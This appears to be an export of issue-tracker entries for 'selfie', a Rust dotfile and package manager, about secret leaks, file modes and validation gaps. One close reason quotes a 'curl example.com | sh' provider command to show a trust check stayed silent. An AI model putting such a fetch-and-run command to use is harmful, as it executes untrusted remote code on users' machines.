Found while planning selfie-6lz4; deliberately left out of that unit's scope.
acceptance_criteria: An unknown key inside an environments block produces a field-level validation error naming the environment and the key.

title: An invalid var name still runs its command and deploys the file unrendered
description:
A dotfile entry with a malformed var name — vars: { "not-a-name": op read x } — is rejected by validation (crates/selfie/src/package/validate.rs), but nothing consults validation on the apply path.

What happens instead: content_source() returns Template because it only tests vars.is_empty(), so the entry is secret-bearing and reaches SecretApply. resolve_content runs 'op read x', a real credential fetch that can raise a biometric or password prompt, and inserts the value into bindings. template::render then rejects the name at is_valid_name and copies the placeholder verbatim. The file deploys through write_file_private with a literal {{ not-a-name }} where the credential belongs.

So a command executes for a binding that provably cannot be substituted, the value is fetched and discarded, and a malformed credentials file is written. Related to but distinct from apply not gating on validation generally: here the entry is known unusable before any command runs, and check_resolvable already exists as the place to refuse things decidable without executing anything.

The doc comment on template::is_valid_name says the shared name check means validation 'rejects illegal names before apply', which is what the apply path does not do.
acceptance_criteria: An entry whose var name cannot be substituted is refused before any command runs.
close_reason:
Fixed in PR #75 (merged 97ff4ad).

selfie-n310: ContentSource::Invalid deleted; DotfileEntry::content_source() returns Result<ContentSource, InvalidEntry>. Both options the bead named were measured and rejected — a whole-package validation gate fails 7 tests including one asserting a bad entry is skipped WHILE the package's other dotfiles still deploy, and a ValidatedPackage type would be constructed at one internal site (apply_all takes no packages) so it is that gate wearing a type.

The claim is deliberately limited and the code says so: the compiler forces a decision at 11 of 11 consumers where 5 were forced before; it does NOT make dropping impossible, since 'let Ok(x) = ... else { continue }' still compiles. Each consumer has a regression test asserting the refusal is REPORTED, which is the guard on that residual.

The concrete hole closed: ContentSource's Display had an Invalid arm, so a malformed entry was printable as though it named a source.

Boundaries verified against built code: _source/_command/_vars/_target refused inside an entry; _anchor, _brew, _targets, __vars and bare _ still legal; the documented TOP-LEVEL _target anchor still parses and resolves through its alias.

TWO THINGS ADDED ON MAINTAINER REVIEW, both from the same root cause — validation was gating on a deploy-path classification:
1. template_dotfiles() no longer routes through content_source(), so a bad var name no longer suppresses 'declared but never used' for other vars in the same entry. docs/package-files.md:576 already stated that rule unqualified; the code had drifted from the docs.
2. The apply-time command notice counted via command_count(), which returns 0 for a refused entry — so 'vars: { not-a-name: curl example.com | sh }' produced SILENCE from the check meant to help judge whether to trust a package. It now counts what the entry declares. command_count() is unchanged for apply's dry-run: validation asks what the file declares, apply asks what it will run, with a test pinning them to agree for every valid shape.

NOT closed by this: n310's motivating anecdote, a templated source escaping the package directory. That was a missing containment guard on a perfectly VALID Template; root cause is selfie-zv4b.

title: ADR-0003 claims the no-leak rule is structurally enforced; it is call-site discipline
description:
docs/adr/0003-no-deploy-state-for-provider-sourced-dotfiles.md:53 states: 'Because the event stream is the library's only unconditional egress, this is enforced where events are constructed rather than at each call site.'

Nothing at event construction enforces anything. EventSender::send_warning, send_dotfile_deployed, send_dotfile_skipped and send_dotfile_conflict (crates/selfie/src/package/event.rs) each take impl fmt::Display and unconditionally .to_string() it into the event. send_dotfile_conflict(source, target, diff) will stringify a raw credential exactly as happily as a summary. The actual enforcement is entirely at the call sites in dotfile_service/service.rs, where secret_origin and secret_conflict_summary build safe strings and each SecretApply phase is individually careful. No type, boundary or dropped field makes a leaking send_* call fail to compile.

The same sentence's premise is contradicted by a file added in the same commit: crates/selfie/tests/dotfile_secret_tracing_tests.rs opens by explaining that the event stream is NOT the only unconditional egress, which is why that test exists.

This is worth more than a wording fix. .claude/rules/secrets.md records three leak paths found by three different reviewers and concludes 'assume there is a fourth'. An ADR asserting the problem is structurally solved is the single claim most likely to stop the next person looking. Either correct the ADR to say the rule is maintained by call-site discipline and covered by leak-regression tests, or make it true — a wrapper type for event-safe strings would do it, and would fail to compile at the call site that leaks.
acceptance_criteria: ADR-0003 describes the enforcement that actually exists, or the enforcement is made structural.
close_reason:
Fixed in PR #74 (merged 445788b).

selfie-ppp: stdout removed from CommandFailure::ExecutionFailed entirely, so the leak is unwritable rather than merely unreached; stderr kept, truncated to 2000 bytes in the library at construction, with truncate_stderr moved to commands/runner.rs so one bound serves both the general failure path and the dotfile resolve path.

The bead's premise was false in BOTH halves, and the PR says so rather than overclaiming: MCP never serialized the field (failures render via Display, which reads neither stdout nor stderr), and EventSender::send_error has zero callers, so PackageEvent::Error is never emitted, one Completed arrives per operation, and format_summary suppresses below two errors — making the CLI block unreachable in production. This closed a fail-open path before it opened.

The two genuinely LIVE egress paths were documented rather than changed, both being by-design output channels: install streaming (stdout AND stderr, CLI AND MCP, on success as well as failure) and selfie package check's display. docs/package-files.md gained a Command Output section stating plainly that a command printing a credential prints it to the terminal and to any connected MCP client, and the 2000-byte bound is now documented user-facing with its marker.

selfie-lkco: ADR-0003's 'enforced where events are constructed' claim replaced with a description of the enforcement that actually exists — ResolvedContent has no Display and a Debug that prints only a byte count, so passing it to an event sender is a compile error; the call-site half is stated as requiring regression-test coverage. The wrapper type the bead proposed was rejected on sink arity: send_warning takes arbitrary text at 20 sites in dotfile_service and 34 library-wide, so a newtype there degenerates to new(String) and would make the ADR MORE misleading by looking enforced.

Follow-ups filed: selfie-t4pd, selfie-b21p, selfie-iuhz, selfie-3ij7, selfie-3hap, selfie-gwhw, selfie-z401.

title: CLI apply runs provider commands under /bin/sh while install and MCP use a login shell
description:
Commit 31bf6bc established login-shell execution for the MCP server and 9e918a7 did the same for the CLI, so the user's profile and PATH are available during install, check and audit. The MCP half of provider-sourced dotfiles inherited it (crates/mcp-server/src/server.rs:228, with a comment noting that op and teller live on the user's PATH). The CLI half did not: crates/cli/src/commands/apply.rs:221 uses ShellCommandRunner::default_shell().

default_shell() is /bin/sh on Unix, while install and check run under the user's shell with -l. Two consequences. Provider commands do not get the login profile, so anything the profile sets rather than exports — SSH_AUTH_SOCK, OP_ variables, PATH entries — is missing. And a command written in fish or zsh syntax works in 'selfie package install' and fails in 'selfie apply', while the same package behaves differently through the CLI and the MCP server.

docs/package-files.md says only that provider commands 'run through a shell', which does not distinguish them.
acceptance_criteria: A provider command sees the same shell and environment through CLI apply as it does through install and through the MCP server, or the difference is documented.

title: Ctrl+C cannot cancel a provider command during selfie apply
description:
Commit 568c528 threaded a CancellationToken from the CLI signal handler through the service and runner layers so Ctrl+C kills in-flight subprocesses, adding a token parameter to every CommandRunner method.

The dotfile apply path does not participate. SecretApply::resolve (crates/selfie/src/dotfile_service/service.rs:705) passes &CancellationToken::new() — a fresh token nothing holds. DotfileServiceImpl::new takes no token, unlike PackageServiceImpl::new. And crates/cli/src/commands.rs never passes the token to handle_apply, though the Spec and Package arms beside it do.

Harmless before this feature, because apply executed nothing. Now Ctrl+C during 'selfie apply' cannot kill an 'op read' blocked on a biometric or password prompt; command_timeout still bounds it, so it is not unbounded, but the interactive escape hatch 568c528 exists to provide is absent and no cancellation event is emitted.
acceptance_criteria: Ctrl+C during selfie apply cancels an in-flight provider command, as it does during install and check.

title: Deploy state file is written world-readable
description:
save_deploy_state (crates/selfie/src/dotfile_service/service.rs:232) writes ~/.local/state/selfie/deploy-state.yml with FileSystem::write_file, so it lands at the process umask default, typically 0644. Secret-bearing dotfile targets are written owner-only at 0600, which makes the state file the weaker of the two.

Its contents are not credentials, but they are a complete map of every target path selfie manages on the machine, plus checksums of repository files. That is a reconnaissance aid on a shared host, and it is readable by anyone when the things it describes are not.

FileSystem::write_file_private already exists and does exactly what is needed — owner-only at creation, atomic replace. The change is the call site plus a test asserting the mode.

This also underpins ADR-0003's refusal to store checksums of secrets. That argument turns on the state file being easier to read than the secret itself; make the file owner-only and the asymmetry disappears, which is a precondition for selfie-0ei5 to even be worth considering.
acceptance_criteria: The deploy state file is readable only by its owner, with a test asserting it.
close_reason:
Fixed in PR #72 (merged 78ae893). save_deploy_state now uses write_file_private, so ~/.local/state/selfie/deploy-state.yml is created owner-only (0600) and a pre-existing 0644 file is tightened on the next write.

Tests assert mode & 0o077 == 0, not & 0o007 — verified by mutation: writing the file 0640 fails both tests, while a world-bits-only check would have passed. The umask-vacuity guard panics when CI is set and skips only locally, so it cannot silently prove nothing on a runner (CI is ubuntu-latest, default umask 022, so it does not fire there).

title: Apply never runs validation, so every consumer must refuse invalid entries by hand
description:
handle_apply iterates ListPackagesOutput::valid_packages(), which is filter_map over PARSE results (crates/selfie/src/package/port.rs). Package::validate() is never called on the apply path — selfie validate is a separate, advisory command. So a package that parses but fails validation is applied.

The consequence is ContentSource::Invalid, a variant that exists only because an invalid entry can reach code that must act on it. Its own doc comment states the rule: apply does not run validation, so every consumer has to refuse it explicitly rather than guess. That is a comment, not a mechanism, and it was not honored for templates — a templated source could escape the package directory because the containment guard the repository-file path already had was not applied to the new call site. Two reviewers found it independently, one of them by noticing the same guard had been established in this repository twice before.

The specific gap is fixed: the guard and its normalization moved to crate::paths, where all three call sites reach it, with a regression test on the repository-file path so relocating it cannot quietly drop it. What is not fixed is the shape. The next consumer of content_source() can forget in exactly the same way, and nothing will fail to compile or fail a test.

Two directions, and the choice is the substance of this issue:

Gate apply on validation, refusing packages with validation errors. Simple and closes it outright, but it is a behavior change: packages that apply today would stop, including ones whose only defect is unrelated to the entry being deployed. Needs a decision about partial application and about which validation levels block.

Or make the invalid state unrepresentable where it is consumed — have apply take a type that can only be constructed from a validated package, so a consumer cannot reach an entry without having refused the invalid case. That converts a rule everyone must remember into a compile error, which is the form that actually holds. Larger change, and it is the direction this codebase has repeatedly found to be the one that sticks.
acceptance_criteria: An invalid dotfile entry cannot reach a consumer that has not explicitly handled it, enforced by the compiler or by apply refusing to run on an invalid package — not by a doc comment.

title: Allow a dotfile entry to specify the deployed file mode
description:
A dotfile entry cannot say what permissions its target should have. Repository-file entries land at the process umask default, typically 0644, and only secret-bearing entries get 0600, automatically and inexpressibly.

Two failures this causes today: a deployed ~/.ssh/config at 0644 makes ssh warn or refuse, and a deployed script is not executable, so ~/.local/bin entries do not work. Both are ordinary daily-driver cases rather than edge cases.

Proposed shape: an optional per-entry mode, written as an octal string (mode: "0755") so YAML does not coerce it to a decimal integer. Absent, behavior is unchanged: umask default for repository files, 0600 for secret-bearing entries.

The constraint that matters: an explicit mode on a secret-bearing entry must not be permitted to loosen it below owner-only. ADR-0003 requires credentials be readable only by their owner, and a mode field that can express 0644 on a provider-sourced entry turns the spec into a way to defeat that. A group- or world-readable mode on a secret-bearing entry should be a validation error, not a warning — the same reasoning that made auto_accept not apply to those entries.

Also decide: whether mode applies on every apply or only at creation (it should apply on every apply, consistent with the in-sync permission tightening already implemented); and Unix-only semantics with a documented no-op elsewhere, matching write_file_private's existing platform note.
acceptance_criteria: A dotfile entry can set its target's mode; a mode that would make a secret-bearing target readable beyond its owner is rejected at validation.

title: CLI prints command stdout verbatim in the multi-error summary
description:
crates/cli/src/display_manager.rs:91-99 prints a failed command's collected stdout verbatim, line by line, in the multi-error summary. The value arrives via impl From<CommandError> for OperationFailure (crates/selfie/src/package/event.rs:1259-1273), which moves stdout into CommandFailure::ExecutionFailed, from where it reaches PackageEvent::Completed and is also serialized by the MCP server.

This is a general secret-egress surface, independent of any one feature: any user-defined command whose stdout contains something sensitive will have it printed to the terminal and sent to an MCP client when that command fails. selfie's whole model is running user-defined commands, so 'the command's stdout is sensitive' is not an exotic case — an install or check command that echoes a token would do it today.

Provider-sourced dotfiles handle their own resolve path specifically to avoid this, but that is a local fix for one caller and does not address the general surface.
acceptance_criteria: A failing command's stdout is not surfaced verbatim by default, or the risk is documented and the value is redactable.

title: cargo test -p selfie does not compile without --features with_mocks
description:
CLAUDE.md documents 'cargo test -p selfie   # Test library only' as a working command, but it fails to compile with unresolved imports for MockFileSystem, MockPackageRepository, MockCommandRunner and others — the mocks are gated behind the with_mocks feature.

It appears to work only because a workspace-wide 'cargo test' unifies the feature in from selfie-cli's dev-dependencies, so the failure is invisible unless the crate is tested alone. Reproduced on a clean tree, so it is pre-existing and unrelated to any current feature work.

Fix by either enabling with_mocks for the crate's own test builds or correcting the documented command in CLAUDE.md and AGENTS.md.
acceptance_criteria: The command documented in CLAUDE.md for testing the library alone actually compiles and runs.
close_reason:
Fixed in PR #70 (merged 19caf87). The compile failure was real when filed and was fixed incidentally by PR #67, which added features=[with_mocks] to test-common's dependency on selfie; test-common is a dev-dependency of selfie, so Cargo unifies the feature into selfie's own test build. What remained broken was CLAUDE.md, which documented the fixed trap as current fact and prescribed an unnecessary flag, contradicting Justfile:31. PR #70 corrects CLAUDE.md and architecture.md, and adds a CI step running the library crate alone, since every workspace-wide command unifies the feature in and so cannot catch this class of break.

NOTE: this bead's acceptance criteria named AGENTS.md, which no longer exists - deleted in cf1efe9 the same day this bead was filed. Only CLAUDE.md needed correcting.

A planned cfg_attr any(test, ...) change was cut and refiled as selfie-gh2v: it is dead code at HEAD, took the no-feature failure from 16 to 55 errors as scoped, and the complete version runs 379 lib tests instead of 393 while exiting 0.

title: Validate environment-specific dotfiles + surface overrides in spec validation
description: ADR-0001 requires: 'Validation must surface environment overrides and missing sources rather than applying them silently.' validate_dotfiles currently only checks top-level (shared) dotfiles. Extend it to also structurally validate each environments.<name>.dotfiles entry (empty/traversal/relative-source/absolute-target checks — extract a per-entry helper), and emit a warning when an environment entry overrides a shared entry's target so the override is not silent. TDD. Follow-up to per-environment dotfiles core (34558ef).
close_reason: Env-specific dotfiles now structurally validated + overrides surfaced as warnings. Implemented in feat(validate) with 3 TDD tests.

title: Secret provider integration point for dotfiles (shell out to 1Password/teller, don't reinvent)
description: ADR-0001 Problem B. selfie must NOT build its own secret store/encryption/templating. Instead provide an integration point that resolves a dotfile's content by running a user-configured provider command at apply time (e.g. 'op read op://vault/item/field', teller). Fits selfie's command-runner identity. DotfileEntry content source becomes: repo file (source) OR provider command (secret/from ref). At apply, run the provider, write result to target; never commit or persist the secret value; drift/state must NOT store the secret's checksum/value (needs distinct semantics - part of this design). Use case: private RubyGems server creds on work machine. User standardizes on 1Password (personal+work) and teller (work GCP/dotenv). Detailed design deferred; depends on selfie-7sv (per-env dotfiles) landing the content-source abstraction. Relates to selfie-t2d (multiple package dirs / private overlay).
close_reason: Provider-sourced and templated dotfiles shipped in PR #67

title: Dotfiles are single-source, not per-environment — no machine-specific config variants (YADM alt-file parity)
description: The 'dotfiles' field is top-level (one 'source' per mapping, deployed to all environments). If home and work legitimately need DIFFERENT versions of a config (e.g. ghostty font size, work-specific proxy settings), selfie cannot represent both — there is a single canonical source. YADM handles this via alt-files (##os.Linux, ##hostname) and templates. For selfie's home+work cross-machine goal this is a structural gap: today the user must unify configs across machines or they'll conflict on deploy. Options to design: per-environment dotfile overrides/variants, templating, or an explicit 'shared vs machine-specific' split. Relates to selfie-522 (environment inheritance). Surfaced 2026-07-23.
design: Per-environment dotfiles (ADR-0001, Problem A). Add optional 'dotfiles: Vec<DotfileEntry>' to EnvironmentConfig. Effective set for current env = top-level shared dotfiles, with any entry whose resolved target matches an env-specific entry REPLACED by it, unioned with env-specific entries introducing new targets. Env-specific overrides shared keyed on target; otherwise added (presence). No exclusion (YAGNI). Source resolution unchanged (relative to package YAML dir). git identity is out of scope (use git-native includeIf). DotfileEntry to gain a content-source abstraction so it composes with secret providers (selfie-B). No backward compat (pre-release).
notes: Core per-environment dotfiles (model + effective-set + apply/drift wiring + tests + docs) landed in 34558ef. Remaining per ADR-0001 tracked as blockers: selfie-chi (validation + override surfacing), selfie-2m1 (list/track/remove consistency).
close_reason: Per-environment dotfiles delivered in 34558ef (EnvironmentConfig.dotfiles + effective-set override/presence + apply/drift wiring + tests + docs; ADR-0001). Single-source limitation resolved. Refinements tracked independently: selfie-chi (env-dotfile validation + override surfacing), selfie-2m1 (list/track/remove consistency).

title: track_dotfile records target as expanded absolute path, breaking cross-machine portability
description: selfie_package_track_dotfile (MCP) and 'selfie track' (CLI) record the dotfile 'target' as a fully-expanded absolute path containing the literal home dir, e.g. 'target: /Users/sloveless/.config/ghostty/config', instead of a portable '~/.config/ghostty/config'. This breaks the core cross-machine value prop: on a machine with a different username (macos-work uses 'steve.loveless') or OS (Linux /home/...), the target resolves to the wrong/nonexistent path. Hand-written specs correctly use '~'. Fix: when tracking, store the target relative to $HOME using '~' (collapse the home prefix) rather than the expanded absolute path. Surfaced 2026-07-23 migrating ghostty/fastfetch/marksman/yamllint/zed via MCP; topgrade had the same issue from earlier tracking.

title: Config loader warns on unknown/ignored keys instead of silently dropping them

This hid a broken dotfiles setup for the user. Per user principle: selfie must NOT fail silently — if it can proceed with a funky-but-usable config, it should, but it must emit a warning about ignored/unknown keys (via the event system, not stdout, per the library boundary rules). Applies to both CLI and MCP frontends.

title: Rename max_parallel_installations to max_concurrency and apply everywhere
description:
Two problems:

1. **Misleading name**: `max_parallel_installations` is not used for installations at all — only for concurrent checks in `list` and dep status checks in `status`.

2. **Inconsistent usage**: Several operations that do concurrent work don't honor it — notably `install` (which the name implies it should) and any future bulk operations.

Fix both: rename to `max_concurrency` and apply the semaphore/chunking pattern to all concurrent operations including install. No backward compatibility needed (no releases yet). Affects: config structs, YAML deserialization, CLI config display, install handler, docs, CLAUDE.md.
close_reason: Renamed max_parallel_installations to max_concurrency, applied concurrency to audit_all and install_recommends, dropped num_cpus dep. PR #41.

title: Show dependency satisfaction status in package info
description:
When displaying package info (info, list, check commands), indicate whether the package's declared dependencies are actually installed. Currently dependencies are listed in the info command but there's no indication of whether they're satisfied.

This would run the check command for each dependency and show a per-dep status (installed/not installed/unknown). Helps users catch broken dependency chains before attempting an install.

Implementation considerations:
- This is essentially running check on each dep, so it should reuse the existing check logic via PackageService.
- For the list command, this could be expensive if every package's deps are checked — consider making it opt-in (e.g., --check-deps flag) or only showing it in info/verbose modes.
- Emit dependency status via PackageEvent so CLI and MCP can render it.
- Handle missing deps gracefully (dep package file doesn't exist vs dep not installed).
close_reason: Implemented dependency satisfaction status in the status command. Added DependencyStatus struct, concurrent dep checking via execute_check_command_quiet, CLI rendering with colored status, and MCP JSON serialization. 5 new tests covering all edge cases.

title: Show git-dirty indicator on package info commands
description:
Commands that display package information (info, list, check, validate, audit) should also indicate whether the local package YAML file has uncommitted git changes. This helps users notice when their package specs have been modified locally but not yet committed, which matters for keeping configs in sync across machines.

Scope: Add a git-status indicator (e.g., 'modified', 'untracked', 'staged') to package output in commands that report package details. The indicator should appear alongside existing package metadata.

Implementation considerations:
- The selfie library has no git functionality today — this is net-new.
- Following hexagonal architecture, git operations should go behind a trait/port (e.g., GitStatusProvider) so the CLI can use a real implementation and tests can mock it.
- The library should emit git status info via PackageEvent so each frontend (CLI, MCP) can render it appropriately.
- Need to handle: file is untracked, file has staged changes, file has unstaged changes. Also handle gracefully when the package directory is not a git repo.
- Skip unpushed detection — committed is sufficient. This avoids complexity around missing upstream tracking branches.
- Performance: for the list command, checking git status for many files should be efficient (e.g., one 'git status --porcelain' call for the whole directory, not one per file).

description: Comprehensive CLI output and UX consistency improvements identified during design review. The CLI has good architectural foundations (DisplayManager, EventProcessor, status_style) but inconsistent application across commands. This epic covers routing all output through DisplayManager, standardizing symbols, creating unified result card patterns, wiring spinners into more commands, and fixing various small inconsistencies.
close_reason: All child issues complete — epic done

title: YAML merge keys (<<: *anchor) not supported by serde_yaml 0.9
description: serde_yaml 0.9 dropped support for YAML merge keys (<<: *anchor) that existed in 0.8. This breaks package files that use anchors to DRY environment configs (e.g. homebrew.yml with _mac: &mac and <<: *mac). The error is now visible thanks to the ParseError display fix, but the underlying issue remains. Options: (1) switch to serde_yml crate (maintained fork with merge key support), (2) pre-process YAML to resolve merge keys before deserialization, (3) document the limitation and suggest users avoid merge keys.
close_reason: Closing as not-a-bug: package files use YAML anchors (&anchor/*anchor) which work fine with serde_yaml 0.9. No files use merge keys (<<: *anchor) which was the hypothesized issue. Unable to reproduce the original problem.

title: Remove async-trait — use native async traits + upgrade mockall to 0.14.0
description:
Remove async-trait crate; use Rust's native async fn in traits (stable since 1.75). Upgrade mockall from 0.13.1 to 0.14.0 which supports native async trait mocking.

Files using #[async_trait]: commands/runner.rs, commands/shell.rs, package/service.rs (×2), config/loader.rs. Note: ConfigLoader uses #[async_trait] but has no async methods — can just remove it.

Mocked async traits: CommandRunner (4 async methods), PackageService (7 async methods). Both use #[automock] + #[async_trait] together.

Benefit: Removes heap allocation per async trait call, removes a dependency, uses idiomatic modern Rust.

Risk: mockall 0.14.0 is a major version bump — may have breaking API changes beyond async trait support. Run full test suite after upgrade.
close_reason: Removed async-trait, upgraded mockall to 0.14, native RPITIT async traits, fixed mock visibility and hardcoded shell path

title: OperationFailure duplicates PackageError types field-for-field
description: OperationFailure has variants like PackageFailure::NotFound that mirror PackageError::PackageNotFound field-for-field, creating a parallel error hierarchy. When an error occurs, the same information exists in both PackageError and OperationFailure. OperationFailure should reference or wrap PackageError rather than duplicating its structure. Related to selfie-mqq (double event emission).
close_reason: Merged EnvironmentFailure and PackageFailure enums into OperationFailure::Package(PackageError) wrapper. Deleted ~130 lines of duplicate type definitions and field-copying conversion code.

title: Implement PackageService::create or remove from trait
description: PackageService::create is declared in the trait but the implementation is a stub that returns a placeholder success. The CLI's create.rs bypasses the service entirely and uses PackageRepository directly — the most significant hexagonal architecture boundary violation. Either implement create properly in the service (with event streaming, validation, etc.) or remove it from the trait until ready.
close_reason: PackageService::create is now fully implemented with service handler, event variants, and CLI integration

title: Add tests for ConfigLoader and YamlLoader
description: config/loader.rs (ConfigLoader trait, ConfigLoadError) and config/yaml.rs (YamlLoader) have zero tests. This is the component responsible for finding and reading the config file on disk — a critical path with several error variants (NotFound, MultipleFound, ConfigError) that are never exercised in isolation. config/validate.rs also lacks unit tests (only tested through CLI integration tests).
close_reason: Added 10 tests covering all validation paths in config/validate.rs

title: Fix double event emission for errors
description: When an error occurs, the library emits it twice: once as PackageEvent::Error and again inside PackageEvent::Completed { result: Failure } with a re-serialized copy in OperationFailure. This forces the CLI to implement PackageNotFoundTracker as a suppression workaround in common.rs. The Completed event should reference the error, not duplicate it. Additionally, OperationFailure duplicates error types field-for-field (e.g., PackageFailure::NotFound mirrors PackageError::PackageNotFound).
close_reason: Fixed in db33934: eliminated double event emission and removed PackageNotFoundTracker workaround

title: Unify PackageService return types across all methods
description: PackageService methods have inconsistent return types: check/install return EventStream directly, while info/validate/list return Result<EventStream, PackageError>. All methods should use the same pattern. Either all return EventStream (encoding early-exit errors as the first event in the stream) or all return Result<EventStream>. The inconsistency forces callers to handle two different patterns.
close_reason: Already fixed in commits 1cbab63, db33934, 9ca8c98, d9ce8a1. All six PackageService methods now uniformly return EventStream directly.

title: CLI commands should accept Box<dyn PackageService> for testability
description: CLI command handlers use the concrete type PackageServiceImpl<YamlPackageRepository<RealFileSystem>, ShellCommandRunner> via create_package_service() in common.rs. This prevents injecting MockPackageService for unit testing. Commands should accept Box<dyn PackageService> (dynamic dispatch) so mock services can be used in tests. MockPackageService and MockCommandRunner are defined but never used because of this.
close_reason: Refactored all 6 CLI command handlers to accept &dyn PackageService parameter instead of creating service internally. Service creation now happens at the dispatch_package_command level in commands.rs.

title: Fix event_processor tests using real filesystem
description: event_processor.rs tests (lines 328-418) create real ShellCommandRunner and RealFileSystem instances pointing at /tmp/nonexistent. These tests depend on filesystem state and could behave differently in CI. Replace with mock-based tests for deterministic behavior.
close_reason: Already fixed: tests now use stream::iter(vec![...]) to construct EventStream directly, with no real filesystem or command runner dependencies.

title: Audit console/dialoguer in library crate dependencies
description: The console and dialoguer crates are listed as dependencies of the selfie library crate (Cargo.toml). These are terminal UI crates that don't appear to be used in the library's production code. Verify usage and move to [dev-dependencies] or remove entirely -- these belong only in the CLI crate.
close_reason: Removed unused console dependency from selfie library Cargo.toml

title: Encapsulate GetPackage fields
description: GetPackage has pub fields (package, file_path, is_new) rather than accessor methods. The CLI's create.rs constructs GetPackage directly, bypassing any encapsulation. Make fields pub(crate) and provide public constructors/accessors, similar to how Package is already designed. This is API hygiene for v1.
close_reason: Encapsulated GetPackage fields and implemented PackageService::create

title: ExecutionFailed.stderr is bounded by convention, not by construction
description:
selfie-ppp removes stdout from CommandFailure::ExecutionFailed entirely, which is STRUCTURAL — there is no field, so the leak cannot be written. The stderr bound is not: CommandFailure is a public enum, so ExecutionFailed's fields are public and any struct-variant literal can set stderr unbounded. crates/cli/src/event_processor.rs:674 does exactly that in a test.

The guarantee holds today only because the two library constructors (From<CommandError> at event.rs:1275 and command_failed at event.rs:1717) are the only production writers, and both call truncate_stderr. ErrorDetail.stderr's new doc comment says 'Already truncated by the library' — true, and true only by that convention.

This is .claude/rules/verification.md's case verbatim: 'An invariant you can state is not an invariant the code enforces. If it matters, make it a type, a guard in a shared module, or a compile error.'

Fix direction: make the field private with a constructor that truncates, so a literal cannot bypass it. Note that changing the enum's shape has adapter impact — event_processor.rs destructures it — so this is not a one-liner.

Related: selfie-iuhz (the same bound is mandated by a rule that one site already violates and two crates cannot call).

Found by the final reviewer on selfie-ppp, which deliberately did not widen scope to fix it.
acceptance_criteria: A struct-variant literal cannot put unbounded stderr into ExecutionFailed.

title: CommandError::Callback is a dead variant whose Display writes its payload verbatim
description:
crates/selfie/src/commands/runner.rs:313 defines CommandError::Callback(OutputChunk). 'grep -rn Callback crates/' returns exactly one hit — the definition. Nothing constructs it.

Its Display (runner.rs:34-40) writes the chunk's inner string verbatim.
